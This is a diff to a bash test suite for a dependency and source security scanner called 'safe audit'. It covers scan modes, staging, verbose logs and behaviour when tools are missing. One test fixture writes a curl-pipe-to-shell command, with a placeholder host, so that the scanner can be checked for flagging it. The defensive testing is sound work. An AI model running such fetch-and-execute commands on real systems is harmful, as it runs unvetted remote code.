@@ -35,6 +35,8 @@ pass "process cleanup stops child processes"
 
 help_output="$("$SAFE_AUDIT" --help)"
 grep -q 'safe audit capabilities \[--json\]' <<<"$help_output" || fail "help omits capabilities"
+grep -q 'safe audit scan \[--verbose\]' <<<"$help_output" || fail "help omits scan --verbose"
+grep -q '\[--deps-only | --full\]' <<<"$help_output" || fail "help omits scan mode options"
 grep -q 'safe audit ioc --update' <<<"$help_output" || fail "help omits ioc --update"
 grep -q 'safe audit setup --create-bundle' <<<"$help_output" || fail "help omits setup --create-bundle"
 grep -q 'safe audit verify sigstore-bundle' <<<"$help_output" || fail "help omits verify sigstore-bundle"
@@ -43,6 +45,7 @@ pass "help output"
 
 grep -q 'capabilities' "$ROOT/lib/completions/_safe" || fail "completion omits capabilities"
 grep -q 'capabilities_opts=(--json)' "$ROOT/lib/completions/_safe" || fail "completion omits capabilities --json"
+grep -q 'scan_opts=(--all --machine --project --verbose --deps-only --full)' "$ROOT/lib/completions/_safe" || fail "completion omits scan mode options"
 grep -q 'sigstore-bundle' "$ROOT/lib/completions/_safe" || fail "completion omits sigstore-bundle"
 grep -q 'tuf-bootstrap' "$ROOT/lib/completions/_safe" || fail "completion omits tuf-bootstrap"
 pass "completion output"
@@ -175,13 +178,15 @@ jq -e '.scans[0].string_hits | length == 1' "$result" >/dev/null || fail "ioc sc
 pass "ioc update scan"
 
 project="$tmp/project"
-mkdir -p "$project/app" "$project/vendor"
+mkdir -p "$project/app" "$project/vendor" "$project/node_modules/pkg"
 cat > "$project/.safe-audit" <<'YAML'
 ignore:
   - vendor
 YAML
 printf '{}\n' > "$project/app/package-lock.json"
+printf 'console.log("app")\n' > "$project/app/index.js"
 printf '{}\n' > "$project/vendor/package-lock.json"
+printf 'console.log("dependency")\n' > "$project/node_modules/pkg/index.js"
 
 lockfiles="$(
   SAFE_AUDIT_CONFIG_DIR="$tmp/config-ignore" \
@@ -217,8 +222,10 @@ PROJECT_PATH="$project" \
 STAGE_PATH="$stage" \
   bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; gather_stage_locally "$PROJECT_PATH" "$STAGE_PATH"'
 [[ -f "$stage/app/package-lock.json" ]] || fail "staging missed app lockfile"
+[[ -f "$stage/app/index.js" ]] || fail "source staging missed first-party source file"
 [[ ! -e "$stage/vendor/package-lock.json" ]] || fail "staging copied ignored vendor lockfile"
-pass "staged manifests honor ignore"
+[[ ! -e "$stage/node_modules/pkg/index.js" ]] || fail "source staging copied default-excluded node_modules"
+pass "source staging honors project and default excludes"
 
 exclude_args="$(
   SAFE_AUDIT_CONFIG_DIR="$tmp/config-excludes" \
@@ -230,6 +237,255 @@ exclude_args="$(
 grep -q '^vendor$' <<<"$exclude_args" || fail "syft excludes omitted vendor pattern"
 grep -q '^vendor/\*\*$' <<<"$exclude_args" || fail "syft excludes omitted vendor subtree pattern"
 pass "syft exclude args"
+
+discovery_verbose="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-discovery-verbose" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-discovery-verbose" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PROJECT_PATH="$project" \
+    bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; SAFE_AUDIT_VERBOSE=1 gather_projects_from_source "$PROJECT_PATH"' 2>&1
+)"
+project_quoted="$(printf '%q' "$project")"
+grep -Fq "verbose: project discovery: source=$project_quoted" <<<"$discovery_verbose" || fail "verbose discovery omitted source"
+grep -Fq 'verbose: project discovery: manifests=2 lockfiles=1 project_roots=1 syft_excludes=2' <<<"$discovery_verbose" || fail "verbose discovery omitted counts"
+grep -Fq "verbose: project root: $project_quoted" <<<"$discovery_verbose" || fail "verbose discovery omitted project root"
+grep -Fq "verbose: lockfile: $project/app/package-lock.json" <<<"$discovery_verbose" || fail "verbose discovery omitted lockfile"
+if grep -Fq "$project/vendor/package-lock.json" <<<"$discovery_verbose"; then
+  fail "verbose discovery included ignored vendor lockfile"
+fi
+pass "verbose project discovery scope"
+
+home_scan="$tmp/home-scan"
+mkdir -p "$home_scan/project/src" "$home_scan/project/node_modules/pkg" "$home_scan/random"
+printf '{"name":"demo"}\n' > "$home_scan/project/package.json"
+printf 'console.log("source")\n' > "$home_scan/project/src/index.js"
+printf 'console.log("dependency")\n' > "$home_scan/project/node_modules/pkg/index.js"
+printf 'console.log("not a project")\n' > "$home_scan/random/outside.js"
+home_stage="$tmp/home-stage"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-home-stage" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-home-stage" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+HOME_SCAN="$home_scan" \
+HOME_STAGE="$home_stage" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; gather_stage_locally "$HOME_SCAN" "$HOME_STAGE" source 0'
+[[ -f "$home_stage/project/package.json" ]] || fail "default home staging missed project manifest"
+[[ -f "$home_stage/project/src/index.js" ]] || fail "default home staging missed project source"
+[[ ! -e "$home_stage/project/node_modules/pkg/index.js" ]] || fail "default home staging copied node_modules"
+[[ ! -e "$home_stage/random/outside.js" ]] || fail "default home staging copied non-project source"
+pass "default scan stages discovered projects only"
+
+remote_stage_fixture="$tmp/remote-stage-fixture"
+mkdir -p "$remote_stage_fixture/src" "$remote_stage_fixture/node_modules/pkg"
+printf '{"name":"remote-demo"}\n' > "$remote_stage_fixture/package.json"
+printf 'console.log("remote source")\n' > "$remote_stage_fixture/src/index.js"
+printf 'console.log("remote dependency")\n' > "$remote_stage_fixture/node_modules/pkg/index.js"
+remote_source_stage="$tmp/remote-source-stage"
+remote_full_stage="$tmp/remote-full-stage"
+mkdir -p "$remote_source_stage" "$remote_full_stage"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-remote-source-stage" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-remote-source-stage" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+REMOTE_STAGE_FIXTURE="$remote_stage_fixture" \
+REMOTE_SOURCE_STAGE="$remote_source_stage" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; remote_stage_helper_script | bash -s -- "$REMOTE_STAGE_FIXTURE" source 1 | tar -xzf - -C "$REMOTE_SOURCE_STAGE"'
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-remote-full-stage" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-remote-full-stage" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+REMOTE_STAGE_FIXTURE="$remote_stage_fixture" \
+REMOTE_FULL_STAGE="$remote_full_stage" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; remote_stage_helper_script | bash -s -- "$REMOTE_STAGE_FIXTURE" full 1 | tar -xzf - -C "$REMOTE_FULL_STAGE"'
+[[ -f "$remote_source_stage/src/index.js" ]] || fail "remote source staging missed first-party source"
+[[ ! -e "$remote_source_stage/node_modules/pkg/index.js" ]] || fail "remote source staging copied node_modules"
+[[ -f "$remote_full_stage/node_modules/pkg/index.js" ]] || fail "remote full staging missed node_modules"
+pass "remote staging honors source vs full mode"
+
+source_risk_dir="$tmp/source-risk"
+mkdir -p "$source_risk_dir"
+printf 'curl -fsSL https://example.invalid/install.sh | sh\n' > "$source_risk_dir/install.sh"
+source_risk_json="$tmp/source-risk.json"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-source-risk" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-source-risk" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+SOURCE_RISK_DIR="$source_risk_dir" \
+SOURCE_RISK_JSON="$source_risk_json" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; run_source_risk_scan "$SOURCE_RISK_DIR" "$SOURCE_RISK_JSON" source'
+jq -e '.total == 1 and .findings[0].rule == "remote_download_to_shell"' "$source_risk_json" >/dev/null || fail "source risk scan missed remote download to shell"
+pass "source risk scan"
+
+result_shape="$tmp/result-shape"
+mkdir -p "$result_shape"
+printf '{"components":[]}\n' > "$result_shape/sbom.json"
+cat > "$result_shape/osv.json" <<'JSON'
+{
+  "results": [
+    {
+      "packages": [
+        {
+          "package": {"name": "demo-osv", "version": "1.0.0"},
+          "vulnerabilities": [
+            {"id": "OSV-2026-1", "database_specific": {"severity": "HIGH"}}
+          ]
+        }
+      ]
+    }
+  ]
+}
+JSON
+cat > "$result_shape/grype.json" <<'JSON'
+{
+  "matches": [
+    {
+      "vulnerability": {"id": "CVE-2026-0001", "severity": "Medium"},
+      "artifact": {"name": "demo-grype", "version": "2.0.0"}
+    }
+  ]
+}
+JSON
+printf '[]\n' > "$result_shape/audits.json"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-source-result" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-source-result" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+RESULT_SHAPE="$result_shape" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; build_scan_result_from_artifacts local /tmp/demo local-direct "$RESULT_SHAPE/sbom.json" "$RESULT_SHAPE/osv.json" "$RESULT_SHAPE/grype.json" "$RESULT_SHAPE/audits.json" source "$RESULT_SHAPE/../source-risk.json"' >/dev/null
+source_result="$tmp/data-source-result/results/local/$(date +%F)-scan.json"
+jq -e '
+  .scan_mode == "source"
+  and .source_scan.total == 1
+  and .cve_scan.high == 1
+  and .cve_scan.medium == 1
+  and (.cve_scan.findings | length) == 2
+  and .verdict == "WARN"
+' "$source_result" >/dev/null || fail "source scan result shape missing or verdict not warned"
+pass "source scan result integration"
+
+ecosystem_scope="$tmp/ecosystem-scope"
+mkdir -p "$ecosystem_scope"
+printf '{"name":"node-only"}\n' > "$ecosystem_scope/package.json"
+ecosystem_scope_json="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-ecosystem-scope" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-ecosystem-scope" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  ECOSYSTEM_SCOPE="$ecosystem_scope" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      run_npm_audit_dir() { printf "%s\n" "$(render_ecosystem_audit_json npm-audit ok 0 0 0 0 0)" > "$2"; }
+      run_cargo_audit_dir() { printf "unexpected cargo audit\n" >&2; return 1; }
+      run_project_ecosystem_audits "$ECOSYSTEM_SCOPE" "$ECOSYSTEM_SCOPE/out"
+    '
+)"
+jq -e 'length == 1 and .[0].scanner == "npm-audit"' <<<"$ecosystem_scope_json" >/dev/null || fail "ecosystem audits ran unrelated project tools"
+pass "ecosystem audits are scoped to detected ecosystems"
+
+missing_audit_tools="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-project-tools" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-project-tools" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  ECOSYSTEM_SCOPE="$ecosystem_scope" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      project_audit_tool_available() { return 1; }
+      gather_projects_from_source "$ECOSYSTEM_SCOPE" >/dev/null
+      missing_project_audit_tools_for_current_projects
+    '
+)"
+grep -q '^npm$' <<<"$missing_audit_tools" || fail "node audit tool was not required"
+if grep -q '^cargo-audit$' <<<"$missing_audit_tools"; then
+  fail "node-only project required cargo-audit"
+fi
+pass "project audit tool requirements are scoped"
+
+rust_scope="$tmp/rust-scope"
+mkdir -p "$rust_scope"
+printf '[package]\nname = "demo"\nversion = "0.1.0"\n' > "$rust_scope/Cargo.toml"
+missing_project_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-project-tools-missing" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-project-tools-missing" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  RUST_SCOPE="$rust_scope" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      project_audit_tool_available() { [[ "$1" != "cargo-audit" ]]; }
+      gather_projects_from_source "$RUST_SCOPE" >/dev/null
+      confirm_scan_with_missing_project_audit_tools local "$RUST_SCOPE"
+    ' 2>&1 || true
+)"
+grep -q 'missing project audit tools.*cargo-audit' <<<"$missing_project_output" || fail "missing project audit prompt omitted cargo-audit"
+grep -q 'cargo install cargo-audit' <<<"$missing_project_output" || fail "missing project audit prompt omitted install hint"
+grep -q 'skipping scan because project audit tools are missing in non-TTY mode' <<<"$missing_project_output" || fail "missing project audit tools did not fail closed"
+pass "missing project audit tools fail closed"
+
+partial_result="$tmp/partial-result"
+mkdir -p "$partial_result"
+printf '{"components":[]}\n' > "$partial_result/sbom.json"
+printf '{"results":[]}\n' > "$partial_result/osv.json"
+printf '{"matches":[]}\n' > "$partial_result/grype.json"
+printf '[{"scanner":"cargo-audit","status":"skipped","total":0,"critical":0,"high":0,"medium":0,"low":0,"note":"cargo-audit unavailable"}]\n' > "$partial_result/audits.json"
+printf '{"status":"ok","note":null,"scanned_files":0,"total":0,"findings":[]}\n' > "$partial_result/source.json"
+partial_summary="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-partial-result" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-partial-result" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PARTIAL_RESULT="$partial_result" \
+    bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; build_scan_result_from_artifacts local /tmp/demo local-direct "$PARTIAL_RESULT/sbom.json" "$PARTIAL_RESULT/osv.json" "$PARTIAL_RESULT/grype.json" "$PARTIAL_RESULT/audits.json" source "$PARTIAL_RESULT/source.json"'
+)"
+partial_result_json="$tmp/data-partial-result/results/local/$(date +%F)-scan.json"
+jq -e '.verdict == "WARN"' "$partial_result_json" >/dev/null || fail "partial ecosystem audit did not warn"
+grep -q 'cargo-audit: skipped (cargo-audit unavailable)' <<<"$partial_summary" || fail "partial ecosystem audit summary looked like zero advisories"
+pass "partial ecosystem audit reports skipped tools"
+
+partial_core="$tmp/partial-core"
+mkdir -p "$partial_core"
+cat > "$partial_core/sbom.json" <<'JSON'
+{"components":[],"metadata":{"tools":[{"name":"safe-audit","note":"syft unavailable"}]}}
+JSON
+printf '{"results":[],"skipped":"osv-scanner unavailable","skip_reason":"scanner_unavailable"}\n' > "$partial_core/osv.json"
+printf '{"matches":[],"skipped":"grype unavailable"}\n' > "$partial_core/grype.json"
+printf '[]\n' > "$partial_core/audits.json"
+printf '{"status":"ok","note":null,"scanned_files":0,"total":0,"findings":[]}\n' > "$partial_core/source.json"
+partial_core_summary="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-partial-core" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-partial-core" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PARTIAL_CORE="$partial_core" \
+    bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; build_scan_result_from_artifacts local /tmp/demo local-direct "$PARTIAL_CORE/sbom.json" "$PARTIAL_CORE/osv.json" "$PARTIAL_CORE/grype.json" "$PARTIAL_CORE/audits.json" source "$PARTIAL_CORE/source.json"'
+)"
+partial_core_json="$tmp/data-partial-core/results/local/$(date +%F)-scan.json"
+jq -e '.verdict == "WARN" and .tool_status["osv-scanner"].status == "skipped" and .tool_status.syft.status == "skipped" and .tool_status.grype.status == "skipped"' "$partial_core_json" >/dev/null || fail "partial core scanner result did not warn"
+grep -q 'osv-scanner: skipped (osv-scanner unavailable)' <<<"$partial_core_summary" || fail "partial core summary omitted osv skip"
+grep -q 'syft: skipped (syft unavailable)' <<<"$partial_core_summary" || fail "partial core summary omitted syft skip"
+grep -q 'grype: skipped (grype unavailable)' <<<"$partial_core_summary" || fail "partial core summary omitted grype skip"
+pass "partial core scanner audit reports skipped tools"
+
+syft_tools_shape="$tmp/syft-tools-shape"
+mkdir -p "$syft_tools_shape"
+cat > "$syft_tools_shape/sbom.json" <<'JSON'
+{
+  "components": [],
+  "metadata": {
+    "tools": {
+      "components": [
+        {"type": "application", "name": "syft", "version": "1.0.0"}
+      ]
+    }
+  }
+}
+JSON
+printf '{"results":[],"skipped":"no lockfiles discovered","skip_reason":"no_lockfiles"}\n' > "$syft_tools_shape/osv.json"
+printf '{"matches":[]}\n' > "$syft_tools_shape/grype.json"
+printf '[]\n' > "$syft_tools_shape/audits.json"
+printf '{"status":"ok","note":null,"scanned_files":0,"total":0,"findings":[]}\n' > "$syft_tools_shape/source.json"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-syft-tools-shape" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-syft-tools-shape" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+SYFT_TOOLS_SHAPE="$syft_tools_shape" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; build_scan_result_from_artifacts local /tmp/demo local-direct "$SYFT_TOOLS_SHAPE/sbom.json" "$SYFT_TOOLS_SHAPE/osv.json" "$SYFT_TOOLS_SHAPE/grype.json" "$SYFT_TOOLS_SHAPE/audits.json" source "$SYFT_TOOLS_SHAPE/source.json"' >/dev/null
+syft_tools_shape_json="$tmp/data-syft-tools-shape/results/local/$(date +%F)-scan.json"
+[[ -s "$syft_tools_shape_json" ]] || fail "syft tools components shape produced empty result"
+jq -e '.tool_status.syft.status == "ok" and .tool_status["osv-scanner"].status == "ok"' "$syft_tools_shape_json" >/dev/null || fail "syft tools components shape did not parse"
+pass "syft cyclonedx tools components shape"
 
 default_bundle_path="$(
   SAFE_AUDIT_CONFIG_DIR="$tmp/config-default-bundle" \
@@ -361,6 +617,50 @@ case_counts="$(
 [[ "$case_counts" == "1 1 1 1" ]] || fail "grype severity counting is case-sensitive"
 pass "grype severity case handling"
 
+osv_nonzero_bin="$tmp/osv-nonzero-bin"
+mkdir -p "$osv_nonzero_bin"
+cat > "$osv_nonzero_bin/osv-scanner" <<'SH'
+#!/usr/bin/env bash
+printf '%s\n' "$*" > "$OSV_ARGS_FILE"
+printf 'Scanned test lockfile and found packages\n' >&2
+cat <<'JSON'
+{
+  "results": [
+    {
+      "packages": [
+        {
+          "package": {"name": "demo", "version": "1.0.0"},
+          "vulnerabilities": [
+            {"id": "OSV-TEST-1", "database_specific": {"severity": "HIGH"}}
+          ]
+        }
+      ]
+    }
+  ]
+}
+JSON
+exit 1
+SH
+chmod +x "$osv_nonzero_bin/osv-scanner"
+printf '{}\n' > "$tmp/osv-lock.json"
+osv_nonzero_result="$tmp/osv-nonzero.json"
+osv_nonzero_stderr="$(
+  PATH="$osv_nonzero_bin:$PATH" \
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-osv-nonzero" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-osv-nonzero" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  OSV_ARGS_FILE="$tmp/osv-args.txt" \
+  OSV_NONZERO_RESULT="$osv_nonzero_result" \
+  OSV_LOCK="$tmp/osv-lock.json" \
+    bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; osv_scan_lockfiles local "$OSV_NONZERO_RESULT" "$OSV_LOCK"' 2>&1
+)"
+if grep -q 'osv-scanner failed' <<<"$osv_nonzero_stderr"; then
+  fail "valid OSV JSON with nonzero exit was treated as scanner failure"
+fi
+jq -e '.results[0].packages[0].vulnerabilities[0].id == "OSV-TEST-1"' "$osv_nonzero_result" >/dev/null || fail "valid OSV JSON with nonzero exit was not preserved"
+grep -q '^scan source --format json --lockfile=' "$tmp/osv-args.txt" || fail "osv-scanner invocation omitted scan source lockfile form"
+pass "osv nonzero valid json preserved"
+
 SAFE_AUDIT_CONFIG_DIR="$tmp/config-missing" \
 SAFE_AUDIT_DATA_DIR="$tmp/data-missing" \
 SAFE_AUDIT_PATH="$SAFE_AUDIT" \
@@ -455,6 +755,62 @@ SAFE_AUDIT_PATH="$SAFE_AUDIT" \
   ' || fail "missing tools default skip did not stop"
 pass "missing tools default skip stops"
 
+scan_missing_core="$tmp/scan-missing-core"
+mkdir -p "$scan_missing_core"
+scan_missing_core_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-scan-missing-core" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-scan-missing-core" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  SCAN_MISSING_CORE="$scan_missing_core" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      detect_machine_tools() {
+        tool_cache_set "$1" "{\"osv-scanner\":null,\"grype\":null,\"syft\":null,\"govulncheck\":null,\"cargo-audit\":null,\"pip-audit\":null,\"socket\":null}"
+      }
+      set +e
+      scan_command --project "$SCAN_MISSING_CORE"
+      rc=$?
+      set -e
+      printf "RC=%s\n" "$rc"
+    ' 2>&1
+)"
+grep -q 'RC=2' <<<"$scan_missing_core_output" || fail "scan with missing core tools did not fail closed"
+grep -q 'skipping scan because required scanners are missing in non-TTY mode' <<<"$scan_missing_core_output" || fail "scan missing core tools omitted skip reason"
+if grep -q 'scan: finished' <<<"$scan_missing_core_output"; then
+  fail "scan with missing core tools logged finished"
+fi
+pass "scan missing core tools exits nonzero"
+
+scan_missing_project_tool="$tmp/scan-missing-project-tool"
+mkdir -p "$scan_missing_project_tool"
+printf '[package]\nname = "demo"\nversion = "0.1.0"\n' > "$scan_missing_project_tool/Cargo.toml"
+scan_missing_project_tool_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-scan-missing-project-tool" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-scan-missing-project-tool" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  SCAN_MISSING_PROJECT_TOOL="$scan_missing_project_tool" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      detect_machine_tools() {
+        tool_cache_set "$1" "{\"osv-scanner\":\"/bin/true\",\"grype\":\"/bin/true\",\"syft\":\"/bin/true\",\"govulncheck\":null,\"cargo-audit\":null,\"pip-audit\":null,\"socket\":null}"
+      }
+      project_audit_tool_available() { [[ "$1" != "cargo-audit" ]]; }
+      set +e
+      scan_command --project "$SCAN_MISSING_PROJECT_TOOL"
+      rc=$?
+      set -e
+      printf "RC=%s\n" "$rc"
+    ' 2>&1
+)"
+grep -q 'RC=2' <<<"$scan_missing_project_tool_output" || fail "scan with missing project audit tool did not fail closed"
+grep -q 'missing project audit tools.*cargo-audit' <<<"$scan_missing_project_tool_output" || fail "scan missing project audit tool omitted tool"
+if grep -q 'scan: finished' <<<"$scan_missing_project_tool_output"; then
+  fail "scan with missing project audit tool logged finished"
+fi
+pass "scan missing project audit tools exits nonzero"
+
 remote_interrupt_output="$(
   SAFE_AUDIT_CONFIG_DIR="$tmp/config-remote-interrupt" \
   SAFE_AUDIT_DATA_DIR="$tmp/data-remote-interrupt" \
@@ -492,6 +848,68 @@ target_order="$(
 )"
 [[ "$target_order" == "local" ]] || fail "--all did not preserve configured machine order"
 pass "--all preserves configured machine order"
+
+scan_project="$tmp/project path"
+mkdir -p "$scan_project"
+scan_project_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-project-target-log" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-project-target-log" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PROJECT_PATH="$scan_project" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      jq ".machines = {\"rainbow\": {\"type\":\"local\"}, \"remote\": {\"type\":\"ssh\", \"host\":\"remote\"}}" "$MACHINES_FILE" > "$MACHINES_FILE.tmp"
+      mv "$MACHINES_FILE.tmp" "$MACHINES_FILE"
+      machine_reachable() { return 0; }
+      detect_machine_tools() { return 0; }
+      confirm_scan_with_missing_tools() { return 0; }
+      scan_source_into_result() { printf "SCAN\t%s\t%s\t%s\t%s\t%s\t%s\n" "$1" "$2" "$3" "$4" "$5" "$6"; }
+      scan_command --verbose --project "$PROJECT_PATH"
+    ' 2>&1
+)"
+scan_project_quoted="$(printf '%q' "$scan_project")"
+grep -Fq "scan: starting rainbow project $scan_project_quoted" <<<"$scan_project_output" || fail "project scan start log omitted target path"
+grep -Fq "scan: finished rainbow project $scan_project_quoted" <<<"$scan_project_output" || fail "project scan finish log omitted target path"
+grep -Fq "verbose: scan targets: rainbow" <<<"$scan_project_output" || fail "verbose scan omitted target machine"
+grep -Fq "verbose: scan mode: source" <<<"$scan_project_output" || fail "verbose scan omitted default source mode"
+grep -Fq "verbose: rainbow: resolved target=$scan_project_quoted" <<<"$scan_project_output" || fail "verbose scan omitted resolved project target"
+grep -Fq "verbose: rainbow: using local direct scan source=$scan_project_quoted" <<<"$scan_project_output" || fail "verbose scan omitted local project source"
+grep -Fq $'SCAN\trainbow\t'"$scan_project"$'\t'"$scan_project"$'\tlocal-direct\tsource\t1' <<<"$scan_project_output" || fail "project scan did not pass target path, mode, and strategy"
+if grep -Fq $'SCAN\tremote\t' <<<"$scan_project_output"; then
+  fail "project scan without --all scanned remote machine"
+fi
+pass "project scan verbose logs targeted local path"
+
+scan_full_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-scan-full" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-scan-full" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PROJECT_PATH="$scan_project" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      scan_machine() { printf "SCAN\t%s\t%s\t%s\n" "$1" "${2:-}" "${3:-}"; }
+      scan_command --full --project "$PROJECT_PATH"
+    ' 2>&1
+)"
+grep -Fq $'SCAN\tlocal\t'"$scan_project"$'\tfull' <<<"$scan_full_output" || fail "--full did not select full scan mode"
+pass "full scan mode"
+
+scan_deps_output="$(
+  SAFE_AUDIT_CONFIG_DIR="$tmp/config-scan-deps" \
+  SAFE_AUDIT_DATA_DIR="$tmp/data-scan-deps" \
+  SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+  PROJECT_PATH="$scan_project" \
+    bash -c '
+      set -- --version
+      source "$SAFE_AUDIT_PATH" >/dev/null
+      scan_machine() { printf "SCAN\t%s\t%s\t%s\n" "$1" "${2:-}" "${3:-}"; }
+      scan_command --deps-only --project "$PROJECT_PATH"
+    ' 2>&1
+)"
+grep -Fq $'SCAN\tlocal\t'"$scan_project"$'\tdeps' <<<"$scan_deps_output" || fail "--deps-only did not select deps scan mode"
+pass "deps-only scan mode"
 
 required_local_tools="$(
   SAFE_AUDIT_CONFIG_DIR="$tmp/config-required-local" \
